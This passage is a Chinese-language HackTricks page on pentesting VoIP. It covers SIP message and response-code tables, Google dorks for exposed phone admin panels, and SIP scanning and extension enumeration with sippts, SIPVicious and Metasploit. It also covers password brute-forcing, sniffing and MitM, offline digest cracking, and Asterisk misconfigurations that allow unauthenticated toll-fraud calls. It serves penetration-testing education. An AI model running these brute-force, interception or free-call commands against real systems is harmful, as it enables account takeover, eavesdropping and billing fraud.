<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Pentesting VoIP</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="pentesting-voip"><a class="header" href="#pentesting-voip">Pentesting VoIP</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>从黑客的角度看待您的网络应用、网络和云</strong></p>
<p><strong>发现并报告具有实际商业影响的关键可利用漏洞。</strong> 使用我们 20 多个自定义工具来映射攻击面，查找让您提升权限的安全问题，并使用自动化漏洞收集重要证据，将您的辛勤工作转化为有说服力的报告。</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<h2 id="voip-基本信息"><a class="header" href="#voip-基本信息">VoIP 基本信息</a></h2>
<p>要开始了解 VoIP 的工作原理，请查看：</p>
<p>{% content-ref url="basic-voip-protocols/" %}
<a href="basic-voip-protocols/">basic-voip-protocols</a>
{% endcontent-ref %}</p>
<h2 id="基本消息"><a class="header" href="#基本消息">基本消息</a></h2>
<pre><code>Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
</code></pre>
<h2 id="响应代码"><a class="header" href="#响应代码">响应代码</a></h2>
<p><strong>1xx—临时响应</strong></p>
<pre><code>100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
</code></pre>
<p><strong>2xx—成功响应</strong></p>
<pre><code>200 OK
202 Accepted
204 No Notification
</code></pre>
<p><strong>3xx—重定向响应</strong></p>
<pre><code>300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
</code></pre>
<p><strong>4xx—客户端失败响应</strong></p>
<pre><code>400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
</code></pre>
<p><strong>5xx—服务器故障响应</strong></p>
<pre><code>500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
</code></pre>
<p><strong>6xx—全局失败响应</strong></p>
<pre><code>600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
</code></pre>
<h2 id="voip-enumeration"><a class="header" href="#voip-enumeration">VoIP Enumeration</a></h2>
<h3 id="电话号码"><a class="header" href="#电话号码">电话号码</a></h3>
<p>红队可以采取的第一步是使用OSINT工具、谷歌搜索或抓取网页来搜索可用的电话号码以联系公司。</p>
<p>一旦你有了电话号码，你可以使用在线服务来识别运营商：</p>
<ul>
<li><a href="https://www.numberingplans.com/?page=analysis&amp;sub=phonenr">https://www.numberingplans.com/?page=analysis&amp;sub=phonenr</a></li>
<li><a href="https://mobilenumbertracker.com/">https://mobilenumbertracker.com/</a></li>
<li><a href="https://www.whitepages.com/">https://www.whitepages.com/</a></li>
<li><a href="https://www.twilio.com/lookup">https://www.twilio.com/lookup</a></li>
</ul>
<p>知道运营商是否提供VoIP服务，你可以确定公司是否在使用VoIP……此外，公司可能没有雇佣VoIP服务，而是使用PSTN卡将自己的VoIP PBX连接到传统电话网络。</p>
<p>诸如自动音乐响应等情况通常表明正在使用VoIP。</p>
<h3 id="google-dorks"><a class="header" href="#google-dorks">Google Dorks</a></h3>
<pre><code class="language-bash"># Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password &amp; intext:"Grandstream Device Configuration" &amp; intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP &amp; phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
</code></pre>
<h3 id="osint-信息"><a class="header" href="#osint-信息">OSINT 信息</a></h3>
<p>任何其他有助于识别所使用的 VoIP 软件的 OSINT 枚举对红队都是有帮助的。</p>
<h3 id="网络枚举"><a class="header" href="#网络枚举">网络枚举</a></h3>
<ul>
<li><strong><code>nmap</code></strong> 能够扫描 UDP 服务，但由于扫描的 UDP 服务数量较多，它的速度非常慢，并且在这类服务上可能不太准确。</li>
</ul>
<pre><code class="language-bash">sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
</code></pre>
<ul>
<li><strong><code>svmap</code></strong> 来自 SIPVicious (<code>sudo apt install sipvicious</code>): 将在指定网络中定位 SIP 服务。</li>
<li><code>svmap</code> <strong>容易被阻止</strong>，因为它使用了 User-Agent <code>friendly-scanner</code>，但你可以修改 <code>/usr/share/sipvicious/sipvicious</code> 中的代码并进行更改。</li>
</ul>
<pre><code class="language-bash"># Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
</code></pre>
<ul>
<li><strong><code>SIPPTS scan</code></strong> from <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS扫描是一个非常快速的SIP服务扫描器，支持UDP、TCP或TLS。它使用多线程，可以扫描大范围的网络。它允许轻松指示端口范围，扫描TCP和UDP，使用其他方法（默认情况下将使用OPTIONS）并指定不同的User-Agent（等等）。</li>
</ul>
<pre><code class="language-bash">sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
</code></pre>
<ul>
<li><strong>metasploit</strong>:</li>
</ul>
<pre><code>auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
</code></pre>
<h4 id="额外的网络枚举"><a class="header" href="#额外的网络枚举">额外的网络枚举</a></h4>
<p>PBX 还可能暴露其他网络服务，例如：</p>
<ul>
<li><strong>69/UDP (TFTP)</strong>: 固件更新</li>
<li><strong>80 (HTTP) / 443 (HTTPS)</strong>: 从网页管理设备</li>
<li><strong>389 (LDAP)</strong>: 存储用户信息的替代方案</li>
<li><strong>3306 (MySQL)</strong>: MySQL 数据库</li>
<li><strong>5038 (Manager)</strong>: 允许从其他平台使用 Asterisk</li>
<li><strong>5222 (XMPP)</strong>: 使用 Jabber 发送消息</li>
<li><strong>5432 (PostgreSQL)</strong>: PostgreSQL 数据库</li>
<li>以及其他...</li>
</ul>
<h3 id="方法枚举"><a class="header" href="#方法枚举">方法枚举</a></h3>
<p>可以使用 <code>SIPPTS enumerate</code> 从 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a> 找到 <strong>可用的方法</strong>。</p>
<pre><code class="language-bash">sippts enumerate -i 10.10.0.10
</code></pre>
<h3 id="分析服务器响应"><a class="header" href="#分析服务器响应">分析服务器响应</a></h3>
<p>分析服务器返回给我们的头部信息非常重要，这取决于我们发送的消息和头部类型。使用来自 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a> 的 <code>SIPPTS send</code>，我们可以发送个性化消息，操纵所有头部，并分析响应。</p>
<pre><code class="language-bash">sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
</code></pre>
<p>如果服务器使用 websockets，获取数据也是可能的。通过 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a> 中的 <code>SIPPTS wssend</code>，我们可以发送个性化的 WS 消息。</p>
<pre><code class="language-bash">sippts wssend -i 10.10.0.10 -r 443 -path /ws
</code></pre>
<h3 id="extension-enumeration"><a class="header" href="#extension-enumeration">Extension Enumeration</a></h3>
<p>在PBX（私人分支交换机）系统中，扩展指的是<strong>分配给组织或企业内各个</strong>电话线路、设备或用户的唯一内部标识符。扩展使得<strong>在组织内部高效路由电话成为可能</strong>，无需为每个用户或设备提供单独的外部电话号码。</p>
<ul>
<li><strong><code>svwar</code></strong> 来自SIPVicious（<code>sudo apt install sipvicious</code>）：<code>svwar</code>是一个免费的SIP PBX扩展线路扫描器。在概念上，它的工作方式类似于传统的拨号器，通过<strong>猜测一系列扩展或给定的扩展列表</strong>。</li>
</ul>
<pre><code class="language-bash">svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
</code></pre>
<ul>
<li><strong><code>SIPPTS exten</code></strong> 来自 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS exten 用于识别 SIP 服务器上的扩展。Sipexten 可以检查大范围的网络和端口。</li>
</ul>
<pre><code class="language-bash">sippts exten -i 10.10.0.10 -r 5060 -e 100-200
</code></pre>
<ul>
<li><strong>metasploit</strong>: 你也可以使用 metasploit 枚举扩展/用户名：</li>
</ul>
<pre><code>auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
</code></pre>
<ul>
<li><strong><code>enumiax</code> (<code>apt install enumiax</code>): enumIAX</strong> 是一个 Inter Asterisk Exchange 协议 <strong>用户名暴力破解枚举器</strong>。enumIAX 可以在两种不同模式下操作：顺序用户名猜测或字典攻击。</li>
</ul>
<pre><code class="language-bash">enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
</code></pre>
<h2 id="voip-攻击"><a class="header" href="#voip-攻击">VoIP 攻击</a></h2>
<h3 id="密码暴力破解---在线"><a class="header" href="#密码暴力破解---在线">密码暴力破解 - 在线</a></h3>
<p>在发现了 <strong>PBX</strong> 和一些 <strong>分机/用户名</strong> 后，红队可以尝试通过 <code>REGISTER</code> 方法对分机进行身份验证，使用常见密码的字典进行暴力破解。</p>
<p>{% hint style="danger" %}
请注意，<strong>用户名</strong> 可以与分机相同，但这种做法可能会因 PBX 系统、其配置和组织的偏好而有所不同...</p>
<p>如果用户名与分机不同，您需要 <strong>找出用户名以进行暴力破解</strong>。
{% endhint %}</p>
<ul>
<li><strong><code>svcrack</code></strong> 来自 SIPVicious （<code>sudo apt install sipvicious</code>）：SVCrack 允许您破解 PBX 上特定用户名/分机的密码。</li>
</ul>
<pre><code class="language-bash">svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
</code></pre>
<ul>
<li><strong><code>SIPPTS rcrack</code></strong> 来自 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS rcrack 是一个用于 SIP 服务的远程密码破解工具。Rcrack 可以在不同的 IP 和端口范围内测试多个用户的密码。</li>
</ul>
<pre><code class="language-bash">sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
</code></pre>
<ul>
<li><strong>Metasploit</strong>:</li>
<li><a href="https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb">https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb</a></li>
<li><a href="https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb">https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb</a></li>
</ul>
<h3 id="voip嗅探"><a class="header" href="#voip嗅探">VoIP嗅探</a></h3>
<p>如果你在<strong>开放Wifi网络</strong>中发现VoIP设备，你可以<strong>嗅探所有信息</strong>。此外，如果你在一个更封闭的网络中（通过以太网连接或受保护的Wifi），你可以在<strong>PBX和网关</strong>之间执行<strong>MitM攻击，例如</strong> <a href="../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing"><strong>ARPspoofing</strong></a>以嗅探信息。</p>
<p>在网络信息中，你可能会找到<strong>管理设备的网页凭据</strong>、用户<strong>分机</strong>、<strong>用户名</strong>、<strong>IP</strong>地址，甚至<strong>哈希密码</strong>和<strong>RTP数据包</strong>，你可以重放这些数据包以<strong>听到对话</strong>，等等。</p>
<p>要获取这些信息，你可以使用工具如Wireshark、tcpdump...但一个<strong>专门创建的嗅探VoIP对话的工具是</strong> <a href="https://github.com/Seabreg/ucsniff"><strong>ucsniff</strong></a>。</p>
<p>{% hint style="danger" %}
请注意，如果<strong>SIP通信中使用了TLS</strong>，你将无法看到明文的SIP通信。<br />
如果使用<strong>SRTP</strong>和<strong>ZRTP</strong>，<strong>RTP数据包将不会是明文</strong>。
{% endhint %}</p>
<h4 id="sip凭据密码暴力破解---离线"><a class="header" href="#sip凭据密码暴力破解---离线">SIP凭据（密码暴力破解 - 离线）</a></h4>
<p><a href="basic-voip-protocols/sip-session-initiation-protocol.html#sip-register-example">查看这个例子以更好地理解<strong>SIP REGISTER通信</strong></a>，以了解<strong>凭据是如何发送的</strong>。</p>
<ul>
<li><strong><code>sipdump</code><strong>和</strong><code>sipcrack</code></strong>，是<strong>sipcrack</strong>的一部分（<code>apt-get install sipcrack</code>）：这些工具可以<strong>从pcap中提取</strong>SIP协议中的<strong>摘要认证</strong>并<strong>进行暴力破解</strong>。</li>
</ul>
<pre><code class="language-bash">sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
</code></pre>
<ul>
<li><strong><code>SIPPTS dump</code></strong> 来自 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS dump 可以从 pcap 文件中提取摘要认证。</li>
</ul>
<pre><code class="language-bash">sippts dump -f capture.pcap -o data.txt
</code></pre>
<ul>
<li><strong><code>SIPPTS dcrack</code></strong> from <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS dcrack 是一个用于破解通过 SIPPTS dump 获得的摘要认证的工具。</li>
</ul>
<pre><code class="language-bash">sippts dcrack -f data.txt -w wordlist/rockyou.txt
</code></pre>
<ul>
<li><strong><code>SIPPTS tshark</code></strong> 来自 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS tshark 从 PCAP 文件中提取 SIP 协议的数据。</li>
</ul>
<pre><code class="language-bash">sippts tshark -f capture.pcap [-filter auth]
</code></pre>
<h4 id="dtmf-代码"><a class="header" href="#dtmf-代码">DTMF 代码</a></h4>
<p><strong>不仅可以在网络流量中找到 SIP 凭据</strong>，还可以找到用于访问 <strong>语音邮件</strong> 的 DTMF 代码。<br />
这些代码可以在 <strong>INFO SIP 消息</strong>、<strong>音频</strong> 或 <strong>RTP 数据包</strong> 中发送。如果代码在 RTP 数据包中，您可以剪切对话的那部分并使用工具 multimo 提取它们：</p>
<pre><code class="language-bash">multimon -a DTMF -t wac pin.wav
</code></pre>
<h3 id="免费通话--asterisks-连接配置错误"><a class="header" href="#免费通话--asterisks-连接配置错误">免费通话 / Asterisks 连接配置错误</a></h3>
<p>在 Asterisk 中，可以允许来自 <strong>特定 IP 地址</strong> 的连接或来自 <strong>任何 IP 地址</strong> 的连接：</p>
<pre><code>host=10.10.10.10
host=dynamic
</code></pre>
<p>如果指定了IP地址，主机<strong>将不需要每隔一段时间发送REGISTER</strong>请求（在REGISTER数据包中发送的生存时间通常为30分钟，这意味着在其他情况下，电话将需要每30分钟REGISTER一次）。然而，它需要开放端口以允许VoIP服务器进行通话。</p>
<p>要定义用户，可以定义为：</p>
<ul>
<li><strong><code>type=user</code></strong>：用户只能作为用户接听电话。</li>
<li><strong><code>type=friend</code></strong>：可以作为对等方拨打电话并作为用户接听（与扩展一起使用）</li>
<li><strong><code>type=peer</code></strong>：可以作为对等方发送和接收电话（SIP-trunks）</li>
</ul>
<p>还可以通过不安全变量建立信任：</p>
<ul>
<li><strong><code>insecure=port</code></strong>：允许通过IP验证的对等连接。</li>
<li><strong><code>insecure=invite</code></strong>：不需要对INVITE消息进行身份验证</li>
<li><strong><code>insecure=port,invite</code></strong>：两者都可以</li>
</ul>
<p>{% hint style="warning" %}
当使用**<code>type=friend</code><strong>时，<strong>host</strong>变量的</strong>值<strong>将</strong>不被使用**，因此如果管理员<strong>错误配置SIP-trunk</strong>使用该值，<strong>任何人都将能够连接到它</strong>。</p>
<p>例如，这种配置将是脆弱的：<br />
<code>host=10.10.10.10</code><br />
<code>insecure=port,invite</code><br />
<code>type=friend</code>
{% endhint %}</p>
<h3 id="免费通话--asterisks上下文错误配置"><a class="header" href="#免费通话--asterisks上下文错误配置">免费通话 / Asterisks上下文错误配置</a></h3>
<p>在Asterisk中，<strong>上下文</strong>是拨号计划中一个命名的容器或部分，<strong>将相关的扩展、操作和规则组合在一起</strong>。拨号计划是Asterisk系统的核心组件，因为它定义了<strong>如何处理和路由来电和去电</strong>。上下文用于组织拨号计划、管理访问控制，并提供系统不同部分之间的分离。</p>
<p>每个上下文在配置文件中定义，通常在**<code>extensions.conf</code>**文件中。上下文用方括号表示，上下文名称包含在其中。例如：</p>
<pre><code class="language-bash">csharpCopy code[my_context]
</code></pre>
<p>在上下文中，您定义扩展（拨打号码的模式）并将其与一系列操作或应用程序关联。这些操作决定了电话的处理方式。例如：</p>
<pre><code class="language-scss">[my_context]
exten =&gt; 100,1,Answer()
exten =&gt; 100,n,Playback(welcome)
exten =&gt; 100,n,Hangup()
</code></pre>
<p>这个示例演示了一个简单的上下文，称为 "my_context"，扩展为 "100"。当有人拨打 100 时，电话将被接听，播放欢迎消息，然后电话将被终止。</p>
<p>这是 <strong>另一个上下文</strong>，允许 <strong>拨打任何其他号码</strong>：</p>
<pre><code class="language-scss">[external]
exten =&gt; _X.,1,Dial(SIP/trunk/${EXTEN})
</code></pre>
<p>如果管理员将 <strong>默认上下文</strong> 定义为：</p>
<pre><code>[default]
include =&gt; my_context
include =&gt; external
</code></pre>
<p>{% hint style="warning" %}
任何人都可以使用 <strong>服务器拨打任何其他号码</strong>（服务器的管理员将为通话付费）。
{% endhint %}</p>
<p>{% hint style="danger" %}
此外，默认情况下 <strong><code>sip.conf</code></strong> 文件包含 <strong><code>allowguest=true</code></strong>，因此 <strong>任何</strong> 攻击者在 <strong>没有认证</strong> 的情况下都能够拨打任何其他号码。
{% endhint %}</p>
<ul>
<li><strong><code>SIPPTS invite</code></strong> 来自 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS invite 检查 <strong>PBX 服务器是否允许我们在没有认证的情况下拨打电话</strong>。如果 SIP 服务器配置不正确，它将允许我们拨打外部号码。它还可以允许我们将通话转移到第二个外部号码。</li>
</ul>
<p>例如，如果您的 Asterisk 服务器有不良的上下文配置，您可以在没有授权的情况下接受 INVITE 请求。在这种情况下，攻击者可以在不知道任何用户/密码的情况下拨打电话。</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
</code></pre>
<p>{% endcode %}</p>
<h3 id="免费电话--配置错误的-ivrs"><a class="header" href="#免费电话--配置错误的-ivrs">免费电话 / 配置错误的 IVRS</a></h3>
<p>IVRS 代表 <strong>交互式语音响应系统</strong>，是一种电话技术，允许用户通过语音或按键输入与计算机系统进行交互。IVRS 用于构建 <strong>自动呼叫处理</strong> 系统，提供一系列功能，例如提供信息、路由电话和捕获用户输入。</p>
<p>VoIP 系统中的 IVRS 通常包括：</p>
<ol>
<li><strong>语音提示</strong>：引导用户通过 IVR 菜单选项和说明的预录音频消息。</li>
<li><strong>DTMF</strong>（双音多频）信号：通过按下电话上的按键生成的触摸音输入，用于在 IVR 菜单中导航和提供输入。</li>
<li><strong>呼叫路由</strong>：根据用户输入将电话直接转接到适当的目的地，例如特定部门、代理或分机。</li>
<li><strong>用户输入捕获</strong>：收集来电者的信息，例如账户号码、案件 ID 或任何其他相关数据。</li>
<li><strong>与外部系统的集成</strong>：将 IVR 系统连接到数据库或其他软件系统，以访问或更新信息、执行操作或触发事件。</li>
</ol>
<p>在 Asterisk VoIP 系统中，您可以使用拨号计划（<strong><code>extensions.conf</code></strong> 文件）和各种应用程序（如 <code>Background()</code>、<code>Playback()</code>、<code>Read()</code> 等）创建 IVR。这些应用程序帮助您播放语音提示、捕获用户输入并控制呼叫流程。</p>
<h4 id="易受攻击的配置示例"><a class="header" href="#易受攻击的配置示例">易受攻击的配置示例</a></h4>
<pre><code class="language-scss">exten =&gt; 0,100,Read(numbers,the_call,,,,5)
exten =&gt; 0,101,GotoIf("$[${numbers}"="1"]?200)
exten =&gt; 0,102,GotoIf("$[${numbers}"="2"]?300)
exten =&gt; 0,103,GotoIf("$[${numbers}"=""]?100)
exten =&gt; 0,104,Dial(LOCAL/${numbers})
</code></pre>
<p>之前的例子中，用户被要求<strong>按1拨打</strong>一个部门，<strong>按2拨打</strong>另一个部门，或者<strong>如果他知道完整的分机号</strong>，则输入完整的分机号。<br />
